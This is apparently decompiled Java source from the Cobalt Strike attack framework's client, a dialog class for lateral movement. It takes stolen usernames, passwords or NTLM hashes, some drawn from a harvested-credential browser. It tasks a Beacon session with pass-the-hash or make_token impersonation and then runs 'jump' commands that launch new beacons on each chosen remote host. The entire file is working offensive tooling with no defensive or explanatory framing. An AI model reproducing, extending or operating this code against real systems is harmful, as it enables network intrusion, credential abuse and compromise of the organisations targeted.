package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.browsers.Credentials;
import beacon.TaskBeacon;
import common.BeaconEntry;
import common.ListenerUtils;
import common.ScListener;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import java.awt.event.ActionEvent;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import ui.ATextField;

public class JumpDialogAlt implements DialogListener, ListSelectionListener, ChangeListener {
   protected JFrame dialog = null;
   protected AggressorClient client = null;
   protected ATextField user;
   protected ATextField pass;
   protected ATextField domain;
   protected Credentials browser;
   protected String exploit;
   protected String[] targets;
   protected JCheckBox b;

   public JumpDialogAlt(AggressorClient var1, String[] var2, String var3) {
      this.client = var1;
      this.browser = new Credentials(var1);
      this.targets = var2;
      this.exploit = var3;
      this.browser.setColumns("user, password, realm, note");
   }

   public void dialogAction(ActionEvent var1, Map var2) {
      String var3 = DialogUtils.string(var2, "bid");
      BeaconEntry var4 = DataUtils.getBeacon(this.client.getData(), var3);
      String var5 = DialogUtils.string(var2, "listener");
      TaskBeacon var6 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{var3});
      if (!this.b.isSelected()) {
         label62: {
            if (this.user.getText() != null && this.user.getText().length() != 0) {
               if (this.pass.getText() != null && this.pass.getText().length() != 0) {
                  break label62;
               }

               DialogUtils.showError("You must specify a password!");
               return;
            }

            DialogUtils.showError("You must specify a user!");
            return;
         }
      }

      ScListener var7 = ListenerUtils.getListener(this.client, var5);
      if (var7 == null) {
         DialogUtils.showError("A listener was not selected");
      } else if (var4 == null) {
         DialogUtils.showError("You must select a Beacon session!");
      } else if (!this.b.isSelected() && !var4.isAdmin()) {
         DialogUtils.showError("Your Beacon must be admin to generate\nand use a token from creds or hashes");
      } else {
         if (!DialogUtils.isShift(var1)) {
            this.dialog.setVisible(false);
            this.dialog.dispose();
         }

         DialogUtils.openOrActivate(this.client, var3);
         if (!this.b.isSelected()) {
            var6.input("rev2self");
            var6.Rev2Self();
            String var8 = this.domain.getText();
            if ("".equals(var8)) {
               var8 = ".";
            }

            if (this.pass.getText().length() == 32) {
               var6.input("pth " + var8 + "\\" + this.user.getText() + " " + this.pass.getText());
               var6.PassTheHash(var8, this.user.getText(), this.pass.getText(), -1, (String)null);
            } else {
               var6.input("make_token " + var8 + "\\" + this.user.getText() + " " + this.pass.getText());
               var6.LoginUser(var8, this.user.getText(), this.pass.getText());
            }
         }

         for(int var10 = 0; var10 < this.targets.length; ++var10) {
            String var9 = DataUtils.getAddressFor(this.client.getData(), this.targets[var10]);
            var6.input("jump " + this.exploit + " " + var9 + " " + var5);
            var6.Jump(this.exploit, var9, var5);
         }

      }
   }

   public void valueChanged(ListSelectionEvent var1) {
      if (!var1.getValueIsAdjusting()) {
         this.user.setText((String)this.browser.getSelectedValueFromColumn("user"));
         this.pass.setText((String)this.browser.getSelectedValueFromColumn("password"));
         this.domain.setText((String)this.browser.getSelectedValueFromColumn("realm"));
      }
   }

   public void stateChanged(ChangeEvent var1) {
      if (this.b.isSelected()) {
         this.user.setEnabled(false);
         this.pass.setEnabled(false);
         this.domain.setEnabled(false);
      } else {
         this.user.setEnabled(true);
         this.pass.setEnabled(true);
         this.domain.setEnabled(true);
      }

   }

   public void show() {
      this.dialog = DialogUtils.dialog(this.exploit, 580, 400);
      this.dialog.addWindowListener(this.browser.onclose());
      DialogManager var1 = new DialogManager(this.dialog);
      var1.addDialogListener(this);
      JComponent var2 = this.browser.getContent();
      this.browser.getTable().getSelectionModel().addListSelectionListener(this);
      this.user = (ATextField)var1.text("user", "User:", 36).get(1);
      this.pass = (ATextField)var1.text("pass", "Password:", 36).get(1);
      this.domain = (ATextField)var1.text("domain", "Domain:", 36).get(1);
      var1.sc_listener_all("listener", "Listener:", this.client);
      var1.beacon("bid", "Session:", this.client);
      this.b = var1.checkbox("token", "Use session's current access token");
      this.b.addChangeListener(this);
      JButton var3 = var1.action_noclose("Launch");
      JButton var4 = var1.help("https://www.cobaltstrike.com/help-psexec");
      this.dialog.add(var2, "Center");
      this.dialog.add(DialogUtils.stackThree(var1.layout(), this.b, DialogUtils.center(var3, var4)), "South");
      this.dialog.setVisible(true);
   }
}
